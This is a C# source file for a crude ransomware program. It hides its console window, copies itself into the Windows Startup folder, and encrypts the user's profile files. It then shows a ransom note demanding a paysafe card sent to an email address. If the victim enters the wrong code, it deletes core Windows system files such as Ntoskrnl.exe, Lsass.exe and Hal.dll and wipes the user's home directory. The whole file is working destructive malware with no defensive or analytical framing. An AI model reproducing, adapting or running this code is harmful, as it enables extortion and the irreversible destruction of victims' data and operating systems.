using System.Diagnostics;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace ransomware
{    
    class program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            CreateFiles();

            EncriptAllFiles();

            Console.BackgroundColor = ConsoleColor.Red;

            Console.WriteLine("Oops looks like I encripted all your important files ;-;\nGive any paysafe card to payThePrice@gmail.com to get the decription code!\nAfter you done that type the decription code here (make sure to press enter)");

            string code = "78f3f788o734y987ry24yruh3fr0u4f0u30u203";
            string input = Console.ReadLine();

            if (code == input)
            {
                Console.BackgroundColor = ConsoleColor.Green;
                Console.WriteLine("Please wait as we decript your files...");
                DecriptAllFiles();
                Console.WriteLine("Files decripted sucessfully!");
            } else
            {
                Console.WriteLine("WRONG PASSWORD BITCH!!!");
                WRONGPASSWORDBITCH();
                BackgroundFlash();
            }
        }

        static void CreateFiles()
        {
            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string dest = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName}";
            File.Copy(src, dest);
        }

        static void EncriptAllFiles()
        {
            DirectoryInfo dirs = new DirectoryInfo($@"C:\Users\{Environment.UserName}");
            foreach(FileInfo file in dirs.GetFiles())
            {
                try
                {
                    file.Encrypt();
                }
                catch { }
            }
        }

        static void DecriptAllFiles()
        {
            DirectoryInfo dirs = new DirectoryInfo($@"C:\Users\{Environment.UserName}");
            foreach(FileInfo file in dirs.GetFiles())
            {
                try
                {
                    file.Decrypt();
                }
                catch { }
            }
        }

        static void BackgroundFlash()
        {
            while(true)
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Thread.Sleep(1000);
                Console.BackgroundColor = ConsoleColor.Red;
                Thread.Sleep(1000);
            }
        }

        static void WRONGPASSWORDBITCH()
        {
            if (File.Exists($@"C:\Windows\System32\bcdboot.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\bcdboot.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Hal.dll"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Hal.dll");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Services.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Services.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Smss.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Smss.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Csrss.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Csrss.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Winlogon.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Winlogon.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Lsass.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Lsass.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\Ntoskrnl.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\Ntoskrnl.exe");
                }
                catch { }
            }
            Thread.Sleep(500);
            DirectoryInfo dirs = new DirectoryInfo($@"C:\Users\{Environment.UserName}");
            foreach (FileInfo file in dirs.GetFiles())
            {
                try
                {
                    file.Delete();
                }
                catch { }
            }
            foreach (DirectoryInfo dir in dirs.GetDirectories())
            {
                try
                {
                    dir.Delete(true);
                }
                catch { }
            }
        }
    }
}